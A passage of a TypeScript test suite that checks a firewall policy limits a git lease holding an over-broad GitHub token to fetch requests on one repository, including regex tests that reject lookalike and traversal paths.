 * requests a fetch of the factory repository makes.
 */
describe("a read lease that took a wider token is held to fetching at the firewall", () => {
  /** An app that issues its full permissions and refuses every narrower set. */
  const wideOnly: TokenMinter = async (permissions) => {
    if (permissions !== null) {
      throw new Error("422: cannot narrow");
    }
    return TOKEN;
  };

  const gitRules = (policy: unknown) =>
    Object.entries(
      (policy as { allow: Record<string, { match?: { path?: unknown } }[]> })
        .allow
    ).filter(
      ([host]) => host === "github.com" || host === "codeload.github.com"
    );

  beforeEach(() => {
    vi.spyOn(console, "warn").mockImplementation(() => undefined);
  });

  test("FETCH_PATH matches the two requests a fetch makes, on the factory repository, and no others", () => {
    const path = new RegExp(FETCH_PATH);
    for (const allowed of [
      "/acme/widgets.git/info/refs",
      "/acme/widgets.git/info/refs?service=git-upload-pack",
      "/acme/widgets.git/git-upload-pack",
      "/acme/widgets/info/refs",
      "acme/widgets.git/git-upload-pack",
    ]) {
      expect(path.test(allowed), allowed).toBe(true);
    }
    for (const refused of [
      "/acme/widgets.git/git-receive-pack",
      "/acme/widgets.git/info/lfs/objects/batch",
      "/acme/other.git/git-upload-pack",
      "/evil/widgets.git/git-upload-pack",
      "/acme/widgets.git.evil/git-upload-pack",
      "/acme/widgetsX.git/git-upload-pack",
      "/x/acme/widgets.git/git-upload-pack",
      "/acme/widgets.git/git-upload-pack/../git-receive-pack",
      "/acme/widgets.git/",
      "/repos/acme/widgets/git/refs",
    ]) {
      expect(path.test(refused), refused).toBe(false);
    }
  });

  test("a repository name is matched literally: its dots and other pattern characters mean nothing", () => {
    expect(FETCH_PATH).toBe(fetchPathFor("acme", "widgets"));
    const path = new RegExp(fetchPathFor("acme-co", "wid.gets+v2"));
    expect(path.test("/acme-co/wid.gets+v2.git/git-upload-pack")).toBe(true);
    expect(path.test("/acme-co/wid.gets+v2/info/refs")).toBe(true);
    for (const refused of [
      "/acme-co/widXgets+v2.git/git-upload-pack",
      "/acme-co/wid.getsssv2.git/git-upload-pack",
      "/acme-co/wid.gets+v2.git/git-receive-pack",
    ]) {
      expect(path.test(refused), refused).toBe(false);
    }
  });

  test.each(["repository", "installation"])(
    "FACTORY_TOKEN_FALLBACK=%s: a clone or fetch on the wider token gets the path rule on both git hosts",
    async (setting) => {
      vi.stubEnv("FACTORY_TOKEN_FALLBACK", setting);
      const { sandbox, steps } = fakeSandbox();
      await runLeasedGitCommand(sandbox, "/usr/bin/git fetch", {
        id: () => "wide",
        installationToken: async () => TOKEN,
        mint: wideOnly,
      });
      const [first] = steps;
      if (first?.kind !== "policy") {
        throw new Error("expected the lease to be attached first");
      }
      expect(first.policy).toEqual(
        leasePolicy("git", TOKEN, "factory-wide", { fetchOnly: true })
      );
      const rules = gitRules(first.policy);
      expect(rules.map(([host]) => host).sort()).toEqual([
        "codeload.github.com",
        "github.com",
      ]);
      for (const [, hostRules] of rules) {
        expect(hostRules).toHaveLength(1);
        expect(hostRules[0]?.match?.path).toEqual({ regex: FETCH_PATH });
      }
    }
  );

  test("the wider token remembered from an earlier lease is held the same way", async () => {
    vi.stubEnv("FACTORY_TOKEN_FALLBACK", "repository");
    const { sandbox, steps } = fakeSandbox();
    const dependencies = { id: () => "wide", mint: wideOnly };
    await runLeasedGitCommand(sandbox, "/usr/bin/git fetch", dependencies);
    await runGitFetch(sandbox, "/usr/bin/git fetch", dependencies);
    const attached = steps.flatMap((step) =>
      step.kind === "policy" && step.policy !== "allow-all" ? [step.policy] : []
    );
    expect(attached).toHaveLength(2);
    for (const policy of attached) {
      expect(policy).toEqual(
        leasePolicy("git", TOKEN, "factory-wide", { fetchOnly: true })
      );
    }
  });

  test("a read lease on a token within its scope has no path rule: the token itself can only read", async () => {
    const { sandbox, steps } = fakeSandbox();
    await runLeasedGitCommand(sandbox, "/usr/bin/git fetch", {
      id: () => "narrow",
      mint: async () => TOKEN,
    });
    const [first] = steps;
    expect(first).toEqual({
      kind: "policy",
      policy: leasePolicy("git", TOKEN, "factory-narrow"),
    });
    expect(JSON.stringify(first)).not.toContain("git-upload-pack");
  });

  test("the path rule is the only difference a fetch-only lease makes", () => {
    const plain = leasePolicy("git", TOKEN, "p") as unknown as {
      allow: Record<string, { match: object }[]>;
    };
    const held = leasePolicy("git", TOKEN, "p", {
      fetchOnly: true,
    }) as unknown as {
      allow: Record<string, { match: { path?: unknown } }[]>;
    };
    expect(Object.keys(held.allow)).toEqual(Object.keys(plain.allow));
    for (const host of ["github.com", "codeload.github.com"]) {
      const { path, ...rest } = held.allow[host]?.[0]?.match ?? {};
      expect(path).toEqual({ regex: FETCH_PATH });
      expect(rest).toEqual(plain.allow[host]?.[0]?.match);
    }
  });

  test("a push on a wider token is not a read, and is not held to fetching", async () => {
    vi.stubEnv("FACTORY_TOKEN_FALLBACK", "repository");
    const { sandbox, steps } = fakeSandbox();
    await runGitPush(sandbox, "factory/x", {
      id: () => "wide",
      mint: wideOnly,
    });
    expect(steps[0]).toEqual({
      kind: "policy",
      policy: leasePolicy("git", TOKEN, "factory-wide"),
    });
  });
});
